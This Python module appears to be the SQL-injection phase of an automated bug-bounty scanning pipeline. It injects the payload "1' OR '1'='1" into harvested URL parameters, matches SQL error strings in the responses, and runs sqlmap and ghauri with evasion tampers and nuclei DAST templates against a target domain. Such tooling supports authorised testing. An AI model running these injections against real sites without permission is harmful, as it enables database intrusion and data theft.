"""
Phase 14: SQL Injection Testing
Techniques from KingOfBugBountyTips + 0xPugal one-liners.
Pipeline: gf sqli → error-based quick check → sqlmap/ghauri deep scan
"""

import os
from core.runner import run_command, tool_exists
from core.utils import read_lines, write_lines
from config import TOOLS


def run_error_based_check(input_file: str, output_file: str, logger) -> list[str]:
    """Quick error-based SQLi detection using qsreplace + httpx.
    One-liner: grep = | qsreplace "' OR '1" | httpx -mr "syntax|mysql|sql"
    This catches low-hanging fruit FAST before running slow sqlmap."""
    qsreplace = TOOLS.get("qsreplace", "qsreplace")
    httpx = TOOLS["httpx"]

    if not tool_exists(qsreplace) or not tool_exists(httpx):
        return []

    logger.info("Running error-based SQLi quick check (qsreplace + httpx)...")
    urls = read_lines(input_file)
    stdin_data = "\n".join(urls)

    # Inject error-triggering payload
    cmd_qs = [qsreplace, "1' OR '1'='1"]
    rc, replaced, _ = run_command(cmd_qs, timeout=60, stdin_data=stdin_data)
    if not replaced:
        return []

    # Check for SQL error messages in response
    error_pattern = "syntax|mysql|mariadb|postgresql|sqlite|oracle|sql error|unclosed|unterminated|warning.*mysql|ORA-[0-9]"
    cmd_httpx = [
        httpx, "-silent", "-nc", "-mc", "200,500",
        "-mr", error_pattern,
        "-t", "20",
    ]
    rc, stdout, _ = run_command(cmd_httpx, output_file=output_file, timeout=120, stdin_data=replaced)

    results = read_lines(output_file)
    if results:
        for r in results[:5]:
            logger.success(f"  SQL error detected: {r[:80]}")
    logger.found_count("error-based SQLi candidates", len(results))
    return results


def run_sqlmap(target_url: str, output_dir: str, logger) -> str:
    """Run sqlmap on a single URL."""
    tool = TOOLS["sqlmap"]
    if not tool_exists(tool):
        return ""
    cmd = [
        tool, "-u", target_url, "--batch", "--random-agent",
        "--level", "2", "--risk", "2", "--threads", "5",
        "--timeout", "15", "--output-dir", output_dir,
        "--smart", "--tamper", "between,randomcase",
    ]
    rc, stdout, stderr = run_command(cmd, timeout=300)
    return stdout


def run_ghauri(target_url: str, output_file: str, logger) -> str:
    """Run ghauri as sqlmap alternative."""
    tool = TOOLS["ghauri"]
    if not tool_exists(tool):
        return ""
    cmd = [
        tool, "-u", target_url, "--batch", "--random-agent",
        "--level", "2", "--risk", "2", "--threads", "5",
    ]
    rc, stdout, stderr = run_command(cmd, output_file=output_file, timeout=300)
    return stdout


def run_nuclei_dast_sqli(input_file: str, output_file: str, logger) -> list[str]:
    """Run nuclei DAST SQLi templates.
    From: cat urls | nuclei -dast -t dast/vulnerabilities/sqli/"""
    tool = TOOLS["nuclei"]
    if not tool_exists(tool):
        return []

    logger.info("Running nuclei DAST SQLi templates...")
    cmd = [
        tool, "-l", input_file,
        "-t", "dast/vulnerabilities/sqli/",
        "-o", output_file, "-silent", "-rl", "30",
    ]
    rc, stdout, stderr = run_command(cmd, timeout=600)

    results = read_lines(output_file)
    logger.found_count("SQLi (nuclei DAST)", len(results))
    return results


def run_phase(domain: str, scan_dir: str, logger) -> str:
    """Run Phase 14: SQL Injection Testing - multi-technique."""
    logger.phase_start(14, "SQL Injection Testing", "error-check + sqlmap + ghauri + nuclei DAST")

    sqli_file = os.path.join(scan_dir, "urls_sqli.txt")
    params_file = os.path.join(scan_dir, "parameters.txt")

    if os.path.isfile(sqli_file) and read_lines(sqli_file):
        source = sqli_file
        logger.info(f"Using {len(read_lines(source))} SQLi-categorized URLs")
    elif os.path.isfile(params_file) and read_lines(params_file):
        source = params_file
    else:
        logger.warning("No parameterized URLs - skipping SQLi testing")
        logger.phase_end(14, "SQLi Testing", 0)
        return ""

    phase_dir = os.path.join(scan_dir, "phase14_sqli")
    os.makedirs(phase_dir, exist_ok=True)

    urls = read_lines(source)[:300]
    scan_file = os.path.join(phase_dir, "sqli_targets.txt")
    write_lines(scan_file, urls)

    all_sqli = []

    # Technique 1: Quick error-based check (catches low-hanging fruit fast)
    error_file = os.path.join(phase_dir, "error_based.txt")
    error_results = run_error_based_check(scan_file, error_file, logger)
    all_sqli.extend([f"[ERROR-BASED] {r}" for r in error_results])

    # Technique 2: nuclei DAST SQLi
    nuclei_file = os.path.join(phase_dir, "nuclei_sqli.txt")
    nuclei_results = run_nuclei_dast_sqli(scan_file, nuclei_file, logger)
    all_sqli.extend(nuclei_results)

    # Technique 3: sqlmap/ghauri deep scan on error-based candidates + top URLs
    deep_targets = list(set(error_results))[:10]
    if not deep_targets:
        # Pick URLs with id/page/cat type params for deep testing
        deep_targets = [u for u in urls if any(p in u.lower() for p in
                        ["id=", "page=", "cat=", "item=", "pid=", "uid="])][:10]

    has_sqlmap = tool_exists(TOOLS["sqlmap"])
    has_ghauri = tool_exists(TOOLS["ghauri"])

    if deep_targets and (has_sqlmap or has_ghauri):
        logger.info(f"Deep SQLi testing on {len(deep_targets)} targets...")
        for i, url in enumerate(deep_targets):
            logger.info(f"  [{i+1}/{len(deep_targets)}] {url[:80]}...")
            if has_sqlmap:
                out_dir = os.path.join(phase_dir, f"sqlmap_{i}")
                result = run_sqlmap(url, out_dir, logger)
                if result and "injectable" in result.lower():
                    all_sqli.append(f"[SQLMAP] {url}")
                    logger.success(f"  SQLi confirmed: {url[:80]}")
            elif has_ghauri:
                out_file = os.path.join(phase_dir, f"ghauri_{i}.txt")
                result = run_ghauri(url, out_file, logger)
                if result and "injectable" in result.lower():
                    all_sqli.append(f"[GHAURI] {url}")
                    logger.success(f"  SQLi confirmed: {url[:80]}")

    # Write results
    sqli_results_file = os.path.join(scan_dir, "sqli_results.txt")
    write_lines(sqli_results_file, sorted(set(all_sqli)))

    logger.phase_end(14, "SQLi Testing", len(set(all_sqli)))
    return sqli_results_file
